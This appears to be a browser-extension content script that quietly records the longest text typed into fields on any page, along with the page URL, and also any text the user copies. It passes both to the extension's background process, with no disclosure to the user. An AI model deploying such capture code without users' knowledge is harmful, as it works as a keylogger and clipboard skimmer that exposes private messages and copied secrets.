const send = (msg) => browser.runtime.sendMessage(msg).catch(() => {});
const debounce = (fn, t = 300) => { let id; return (...a) => { clearTimeout(id); id = setTimeout(() => fn(...a), t); }; };

function captureTextState() {
  const nodes = [...document.querySelectorAll('textarea, input[type="text"], input:not([type])')]
    .filter(el => el && typeof el.value === 'string' && el.value.length >= 3);
  if (!nodes.length) return null;
  const el = nodes.sort((a, b) => b.value.length - a.value.length)[0];
  return { val: el.value.slice(0, 5000), url: location.href, ts: Date.now() };
}

const pushText = debounce(() => {
  const s = captureTextState();
  if (s) send({ type: "text-input", ...s });
}, 300);

document.addEventListener('input', pushText, true);
document.addEventListener('change', pushText, true);

window.addEventListener('beforeunload', () => {
  const s = captureTextState();
  if (s) send({ type: "text-input", ...s });
}, true);

document.addEventListener('copy', (e) => {
  let txt = '';
  try {
    txt = document.getSelection()?.toString() || '';
    if (!txt && e.clipboardData) {
      txt = e.clipboardData.getData('text/plain') || '';
    }
  } catch {}
  if (txt) send({ type: "clipboard", val: txt.slice(0, 5000), url: location.href, ts: Date.now() });
}, true);
